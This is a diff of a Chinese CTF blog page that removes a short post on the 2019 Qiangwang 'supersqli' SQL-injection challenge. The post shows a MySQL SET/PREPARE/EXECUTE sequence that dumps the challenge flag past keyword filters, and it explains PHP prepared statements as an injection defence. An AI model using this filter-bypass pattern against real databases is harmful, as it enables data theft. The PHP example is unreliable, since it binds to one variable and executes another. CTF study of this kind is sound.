-<p><img src="http://goodcheerleung.gitee.io/mycute20190905/15676946962230.png" alt="img"></p>
-<h1 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h1><p><a href="https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
-<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="mysql批处理"><a href="#mysql批处理" class="headerlink" title="mysql批处理"></a>mysql批处理</h2><pre><code class="csharp">设置变量：set @s=sql语句
-预处理语句：prepare 预处理名字 from ‘sql语句’
-执行预处理：execute 预处理名字 [using 变量]</code></pre>
-<p>例子：</p>
-<pre><code class="shell">mysql &gt;&gt; set @s=&quot;select group_concat(flag) from supersqli.1919810931114514&quot;
-mysql &gt;&gt; PREPARE a FROM @s
-mysql &gt;&gt; EXECUTE a</code></pre>
-<h2 id="知识拓展——PHP预处理"><a href="#知识拓展——PHP预处理" class="headerlink" title="知识拓展——PHP预处理"></a>知识拓展——PHP预处理</h2><pre><code class="php">//预处理语句，?为绑定的参数
-$mysql = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)&quot;);
-
-//绑定参数第一个参数为参数列处理其余参数的数据类型。如下$firstname, $lastname, $email三个变量都为字符串类型所以，第一个参数为sss
-
-$mysql-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);
-
-/*参数1有以下四种类型:
-i - integer（整型）
-d - double（双精度浮点型）
-s - string（字符串）
-b - BLOB（布尔值）*/
-
-//下面设置参数并执行
-$firstname = &quot;John&quot;;
-$lastname = &quot;Doe&quot;;
-$email = &quot;john@example.com&quot;;
-$stmt-&gt;execute();</code></pre>
-<h2 id="php批处理的优点："><a href="#php批处理的优点：" class="headerlink" title="php批处理的优点："></a>php批处理的优点：</h2><ul>
-<li>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</li>
-<li>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</li>
-<li>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2263,7 +2186,7 @@ $stmt-&gt;execute();</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-count">73</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2334,12 +2257,12 @@ $stmt-&gt;execute();</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">263k</span>
+    <span title="站点总字数">267k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:59</span>
+    <span title="站点阅读时长">4:02</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
